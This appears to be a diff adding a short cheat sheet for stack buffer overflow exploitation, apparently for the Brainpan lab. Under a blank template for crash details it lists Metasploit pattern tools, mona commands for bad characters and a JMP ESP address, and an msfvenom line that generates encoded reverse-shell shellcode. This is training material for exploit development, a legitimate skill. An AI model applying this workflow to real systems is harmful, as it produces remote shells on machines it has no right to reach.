@@ -1,0 +1,45 @@
+IP: 1
+Port:
+
+Vulnerable Command: ?
+Crashed at: 
+
+EIP at crash:
+
+
+Pattern offset:
+
+
+Bad Chars:
+00
+
+Jump Location:
+
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 > pattern
+
+cat pattern | xclip -sel clip
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 37684136 -l 500
+
+
+
+
+!mona compare -f C:\users\administrator\desktop\all_chars.bin -a esp
+
+!mona modules
+
+!mona find -s "\xff\xe4" -m brainpan.exe
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=1 LPORT=443 -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -v shellcode
+
+
+
+==== Mona Prereqs ====
+
+# set a working folder
+!mona config -set workingfolder c:\logs\%p
+
+#creates bytearray from 00 to ff
+!mona bytearray
